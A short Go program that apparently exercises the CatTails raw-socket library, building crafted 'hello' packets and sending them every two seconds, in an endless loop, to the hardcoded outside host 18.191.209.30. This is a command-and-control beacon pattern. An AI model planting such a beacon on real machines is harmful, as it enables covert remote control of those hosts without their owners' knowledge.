package main

import (
	"fmt"
	"net"
	"time"

	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

func sendHello(fd int, count int, iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
	packet := cattails.CreatePacket(iface, src, dst, dstMAC, cattails.CreateHello(iface.HardwareAddr, src, count))

	addr := cattails.CreateAddrStruct(iface)

	cattails.SendPacket(fd, iface, addr, packet)
}

func main() {

	fd := cattails.NewSocket()
	defer unix.Close(fd)

	iface, src := cattails.GetOutwardIface("8.8.8.8:80")

	//vm := cattails.CreateBPFVM(filterRaw)

	dstMAC, _ := cattails.GetRouterMAC()

	count := 0
	for {
		time.Sleep(2 * time.Second)
		// 18.191.209.30
		sendHello(fd, count, iface, src, net.IPv4(18, 191, 209, 30), dstMAC)
		count++
		fmt.Println(count)
	}

}
